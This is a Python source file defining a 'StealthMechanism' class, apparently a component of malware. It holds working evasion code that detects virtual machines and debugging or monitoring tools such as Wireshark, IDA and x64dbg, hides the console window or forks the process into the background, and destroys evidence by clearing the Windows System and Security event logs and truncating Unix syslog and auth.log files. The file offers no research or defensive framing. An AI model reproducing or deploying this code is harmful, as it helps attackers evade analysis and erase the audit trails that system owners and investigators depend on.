import platform
import os
import sys
import ctypes
import subprocess
import psutil

class StealthMechanism:
    @staticmethod
    def check_virtualization():
        """Check if running in a virtual environment"""
        virtualizations = ['VirtualBox', 'VMware', 'QEMU', 'Xen']
        
        # Check system info
        system_info = platform.system() + platform.version() + platform.release()
        if any(v in system_info for v in virtualizations):
            return True
            
        # Check running processes
        for proc in psutil.process_iter(['name']):
            if any(v.lower() in proc.info['name'].lower() for v in virtualizations):
                return True
                
        return False
        
    @staticmethod
    def hide_process():
        """Hide the current process"""
        if os.name == 'nt':  # Windows
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            
            # Hide console window
            SW_HIDE = 0
            hwnd = kernel32.GetConsoleWindow()
            if hwnd:
                user32.ShowWindow(hwnd, SW_HIDE)
                
            # Set process priority
            handle = kernel32.GetCurrentProcess()
            kernel32.SetPriorityClass(handle, 0x00000100)  # BELOW_NORMAL_PRIORITY_CLASS
            
        else:  # Unix-like
            # Fork to background
            try:
                pid = os.fork()
                if pid > 0:
                    sys.exit(0)
            except OSError:
                pass
                
    @staticmethod
    def clean_traces():
        """Clean various system traces"""
        if os.name == 'nt':
            # Clear Windows event logs
            try:
                subprocess.run(['wevtutil.exe', 'cl', 'System'], 
                             capture_output=True, 
                             creationflags=subprocess.CREATE_NO_WINDOW)
                subprocess.run(['wevtutil.exe', 'cl', 'Security'], 
                             capture_output=True, 
                             creationflags=subprocess.CREATE_NO_WINDOW)
            except:
                pass
        else:
            # Clear Unix-like logs
            log_files = [
                '/var/log/syslog',
                '/var/log/auth.log',
                '/var/log/messages'
            ]
            for log in log_files:
                try:
                    if os.path.exists(log):
                        with open(log, 'w') as f:
                            f.truncate(0)
                except:
                    pass
                    
    @staticmethod
    def check_debugging():
        """Check for debugging tools"""
        suspicious_processes = [
            'wireshark', 'tcpdump', 'ida64', 'ollydbg', 'x64dbg',
            'processhacker', 'processexplorer', 'procmon'
        ]
        
        for proc in psutil.process_iter(['name']):
            if any(s in proc.info['name'].lower() for s in suspicious_processes):
                return True
                
        return False
